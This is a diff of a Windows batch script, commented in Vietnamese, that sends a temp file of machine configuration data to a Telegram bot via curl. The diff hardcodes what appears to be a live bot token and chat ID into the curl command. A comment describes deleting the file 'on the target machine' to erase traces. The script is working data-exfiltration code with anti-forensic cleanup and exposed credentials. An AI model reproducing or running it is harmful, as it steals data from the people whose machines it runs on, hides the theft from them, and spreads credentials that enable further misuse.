@@ -21,12 +21,8 @@ echo Tac vu hoan thanh!
 
 echo Dang dong bo du lieu len he thong Telegram...
 
-:: Buoc 2: Cau hinh Telegram
-set "TOKEN=8982230721:AAGAIhbsrBIILFrwdr7RsnFLWUKjwf9QNLE"
-set "CHAT_ID=6473475153"
-
-:: Buoc 3: Gộp chung thành 1 dòng độc lập để tránh lỗi ký tự ngắt dòng
-curl -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" -F "chat_id=%CHAT_ID%" -F "document=@%temp_file%" -F "caption=Thong tin cau hinh may: %computername%"
+:: Buoc 2 & 3: Dien truc tiep Token vao duong dan curl de khong bi loi bien trong Windows
+curl -X POST "https://api.telegram.org/bot8982230721:AAGAIhbsrBIILFrwdr7RsnFLWUKjwf9QNLE/sendDocument" -F "chat_id=6473475153" -F "document=@%temp_file%" -F "caption=Thong tin cau hinh may: %computername%"
 
 :: Buoc 4: Xoa file tam tren may muc tieu de don dep dau vet
 del "%temp_file%"
